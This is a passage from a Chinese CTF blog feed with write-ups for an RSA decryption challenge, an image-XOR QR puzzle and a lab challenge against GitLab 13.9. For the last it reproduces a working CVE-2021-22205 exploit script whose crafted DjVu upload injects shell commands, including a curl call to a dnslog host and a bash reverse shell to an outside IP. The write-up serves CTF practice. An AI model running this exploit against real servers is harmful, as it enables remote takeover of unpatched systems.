punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># ('n =', mpz(121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313L))</span><span class="token comment"># ('c =', mpz(42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267L))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据以下代码求出p、q</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrimer <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token comment">#p=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><span class="token comment">#q=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span><span class="token comment">#n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>盲猜e&#x3D;65537<br>密文c已经给出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终脚本:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>q <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token comment"># 密文</span>c <span class="token operator">=</span> <span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 求明文</span>M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># 快速求幂取模运算</span><span class="token comment"># Convert the plaintext to a string</span>M_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># Convert M to hexadecimal and remove the '0x' prefix</span>M_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>M_str<span class="token punctuation">)</span>  <span class="token comment"># Convert the hexadecimal string to bytes</span>M_str_final <span class="token operator">=</span> M_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decode bytes to UTF-8 string</span><span class="token keyword">print</span><span class="token punctuation">(</span>M_str_final<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用rsa解密工具<br><img src="https://img-blog.csdnimg.cn/ad455aeee45246fbaf257543b70001ad.png" alt="2"></p><h3 id="国际象棋与二维码："><a href="#国际象棋与二维码：" class="headerlink" title="国际象棋与二维码："></a>国际象棋与二维码：</h3><p><img src="https://img-blog.csdnimg.cn/90005912edcb4bdcb16217985d73a064.png" alt="23"><br>用这个图片跟原图片 异或<br><img src="https://img-blog.csdnimg.cn/f606096be1794c0aac580ef70f990176.png" alt="5"><br>扫码就是flag</p><h3 id="新型车联网安全网络协议破解（阶段一）"><a href="#新型车联网安全网络协议破解（阶段一）" class="headerlink" title="新型车联网安全网络协议破解（阶段一）"></a>新型车联网安全网络协议破解（阶段一）</h3><p>连上VPN后访问页面发现是gitlab，版本13.9，找到<a href="https://github.com/Al1ex/CVE-2021-22205">CVE-2021-22205</a><br>使用脚本直接打，可是整了半天使用脚本一直打不通😶‍🌫️，与靶机连接不上，借一个改过的poc<br>借鉴于<a href="https://mp.weixin.qq.com/s/LyxgB7YFM0RcZSN5hmZF9Q">这里</a>⬅️</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> socks<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSouprequests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""   ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____    / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___|  | |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \  | |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |  \____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/                                   Author:Al1ex@Heptagram                                Github:https://github.com/Al1ex                              """</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''        验证模式：python CVE-2021-22205.py -v true -t target_url         攻击模式：python CVE-2021-22205.py -a true -t target_url -c command         批量检测：python CVE-2021-22205.py -s true -f file         '''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 目标 &#123;&#125; 存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 目标 &#123;&#125; 不存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;"</span><span class="token operator">+</span>  command <span class="token operator">+</span><span class="token string">"&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 目标 &#123;&#125; 存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 请到dnslog或主机检查执行结果"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 目标 &#123;&#125; 不存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> url_link <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>                url_path <span class="token operator">=</span> format_url<span class="token punctuation">(</span>url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                check<span class="token punctuation">(</span>url_path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">format_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"http"</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> <span class="token string">"https://"</span> <span class="token operator">+</span> url            url <span class="token operator">=</span> url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> url    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'URL 错误 &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    attack<span class="token punctuation">(</span><span class="token string">"http://172.18.0.4/"</span><span class="token punctuation">,</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/8.1xx.1xx.xx/6666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    title<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Geekgame2023</title>
    <link href="http://3143047748.github.io/2023/10/27/Geekgame2023/"/>
    <id>http://3143047748.github.io/2023/10/27/Geekgame2023/</id>
    <published>2023-10-27T14:42:03.000Z</published>
    <updated>2023-11-17T13:24:32.370Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="961c5797e0147bd196a092cd6efefa5fdf6a5241428179f60fa9d023191a9df2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
